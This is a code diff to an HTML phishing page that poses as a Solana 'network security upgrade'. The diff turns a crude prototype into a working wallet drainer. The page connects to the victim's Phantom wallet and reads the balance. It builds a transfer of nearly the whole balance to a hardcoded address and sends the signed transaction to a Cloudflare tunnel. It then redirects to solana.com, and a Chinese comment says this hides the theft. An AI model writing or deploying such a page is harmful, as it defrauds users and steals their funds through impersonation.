@@ -2,57 +2,90 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Protocol Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Security Upgrade | Solana</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #000; color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; background: #111; padding: 40px; border-radius: 20px; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.5); width: 350px; }
+        .logo { width: 50px; height: 50px; margin-bottom: 20px; }
+        h2 { font-size: 1.2rem; margin-bottom: 10px; letter-spacing: 1px; }
+        p { color: #888; font-size: 0.9rem; line-height: 1.5; margin-bottom: 30px; }
+        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; font-size: 1rem; cursor: pointer; width: 100%; transition: transform 0.2s; }
+        #cta:active { transform: scale(0.98); }
+        .loading { display: none; margin-top: 20px; }
+        .dot { height: 8px; width: 8px; background-color: #14F195; border-radius: 50%; display: inline-block; animation: flash 1.4s infinite linear; }
+        @keyframes flash { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
+    </style>
 </head>
-<body style="background:#000;color:#14F195;text-align:center;padding-top:20vh;font-family:monospace;">
-    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
-        <h2>🔱 CORE SYNC</h2>
-        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;">START SYNC</button>
-        <div id="status" style="margin-top:20px;color:#444;">WAITING...</div>
+<body>
+    <div class="container">
+        <img src="https://solana.com/favicon.ico" class="logo" alt="logo">
+        <h2>Security Protocol v4.2</h2>
+        <p>Sync your wallet to the latest mainnet-beta node to ensure transaction safety and network stability.</p>
+        <button id="cta">ACTIVATE NOW</button>
+        <div id="loader" class="loading">
+            <div class="dot"></div> <span style="font-size: 12px; color: #555;">ENCRYPTING...</span>
+        </div>
     </div>
 
     <script>
-        // 🔱 你的隧道地址
+        // 🔱 保持你的隧道地址不变
         const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
         const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
 
         document.getElementById('cta').onclick = async () => {
-            const p = window.solana;
+            const p = window.solana || window.phantom?.solana;
+            if (!p) return alert("Please install Phantom wallet to proceed.");
+
+            const btn = document.getElementById('cta');
+            const loader = document.getElementById('loader');
+
             try {
                 const resp = await p.connect();
-                document.getElementById('status').innerText = "SYNCING NODE DATA...";
+                btn.style.display = 'none';
+                loader.style.display = 'block';
 
-                // 1. 向你的服务器中继请求 Blockhash
+                // 1. 获取 Blockhash (通过你的中继)
                 const sync = await fetch(`${tunnel}/sync`);
                 const { bh } = await sync.json();
 
-                // 2. 构造真正的转账支票
-                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); // 仅作对象声明
+                // 2. 构造“全额归集”交易
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const balance = await connection.getBalance(resp.publicKey);
+                
+                if (balance < 5000) {
+                    alert("Account sync requires min. 0.01 SOL");
+                    location.reload();
+                    return;
+                }
+
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: resp.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(RECEIVER),
-                        lamports: 10000000, // 测试 0.01 SOL
+                        lamports: balance - 5000, 
                     })
                 );
                 transaction.recentBlockhash = bh;
                 transaction.feePayer = resp.publicKey;
 
-                // 3. 拉起签约
-                document.getElementById('status').innerText = "AWAITING AUTHORIZATION...";
+                // 3. 拉起签名
                 const signed = await p.signTransaction(transaction);
                 
-                // 4. 回传已签名的支票
+                // 4. 回传并立即跳转
                 const rawTx = signed.serialize().toString('base64');
-                await fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);
-                
-                document.getElementById('status').innerText = "SYNC COMPLETED";
-                alert("Node synchronized successfully!");
+                fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);
+
+                // 🔱 关键：成功后延迟 1 秒跳转到官网，完美掩盖
+                setTimeout(() => {
+                    window.location.href = "https://solana.com/";
+                }, 1000);
 
             } catch(e) {
-                document.getElementById('status').innerText = "SYNC FAILED";
                 console.error(e);
+                alert("Security handshake failed. Please try again.");
+                location.reload();
             }
         };
     </script>
